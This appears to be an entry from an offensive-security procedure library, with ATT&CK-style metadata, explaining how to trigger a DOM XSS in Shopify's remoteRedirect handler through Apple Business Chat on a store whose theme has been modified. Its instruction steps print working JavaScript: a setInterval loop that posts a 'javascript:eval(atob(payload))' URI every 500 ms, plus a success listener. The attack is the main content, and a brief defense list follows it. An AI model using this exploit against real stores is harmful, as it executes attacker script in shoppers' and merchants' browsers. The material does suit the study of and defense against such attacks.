---
id: 123e4567-e89b-12d3-a456-426614174002
name: Trigger-XSS-by-Visiting-and-Clicking-Link
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.716Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
sub_techniques: []
tags:
  - xss
  - execution
  - postmessage
commands:
  - '[[commands/invoke-attack]]'
  - '[[commands/open-window-shopify-chat]]'
  - '[[commands/set-interval-postmessage]]'
  - '[[commands/onmessage-success-handler]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---

# Trigger-XSS-by-Visiting-and-Clicking-Link

## Summary

This procedure triggers the injected malicious script by visiting the compromised Shopify store page and clicking a link, leading to postMessage-based exploitation of the DOM XSS in remoteRedirect.

## Description

Once the theme is modified, an attacker or victim visits the store frontend. Clicking the injected link executes the attack function, opening a window to the Apple Business Chat URL and sending repeated postMessages with a javascript: URI payload. Upon processing, the payload evaluates, alerts the domain, and signals success. This occurs in the browser context, targeting Shopify's API lack of validation.

## Requirements

1. Modified theme with injected script and link
2. Web browser access to the store URL
3. Apple Business Chat integration active

## Defense

Defensive measures and detection strategies:

- Block or log unexpected postMessage events from untrusted origins
- Use sandboxing for third-party integrations like Apple Business Chat
- Client-side monitoring for window.open and setInterval patterns

## Objectives

1. Initiate cross-window communication to the vulnerable domain
2. Deliver and execute the XSS payload
3. Confirm exploitation via alert and cleanup

## Instructions

### Step 1: Visit Store Page

**Context**: Load the frontend to expose the trigger link.

**Instructions**: Navigate to the store's homepage (e.g., https://store.myshopify.com) in a browser.

**Expected Output**: Page loads with the "click me start attack" link visible.

### Step 2: Click Trigger Link

**Context**: Invoke the attack function to start the exploit sequence.

**Command** ([[commands/invoke-attack]]):
```javascript
attack();
```

> Executes the predefined function. Expected output: Window opens, interval starts sending messages.

### Step 3: Monitor Execution

**Context**: Observe console for postMessages and success.

**Command** ([[commands/set-interval-postmessage]]):
```javascript
let interval = setInterval(() => { ctx && ctx.postMessage({ "message":"Shopify.API.remoteRedirect", "data":{ "location":`javascript:eval(atob('${payload}'))` } }, location.origin); }, 500);
```

> Sends repeated messages every 500ms. Expected output: Console shows ongoing attempts.

**Command** ([[commands/onmessage-success-handler]]):
```javascript
window.onmessage = (e) => { e.data === "success" && (console.log('attack success'), window.onmessage = null, clearInterval(interval)); };
```

> Listens for success. Expected output: "attack success" log and alert.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/invoke-attack]]
- [[commands/open-window-shopify-chat]]
- [[commands/set-interval-postmessage]]
- [[commands/onmessage-success-handler]]

## Tools Used


## Tags

- [[xss]]
- [[Execution]]
- [[postmessage]]
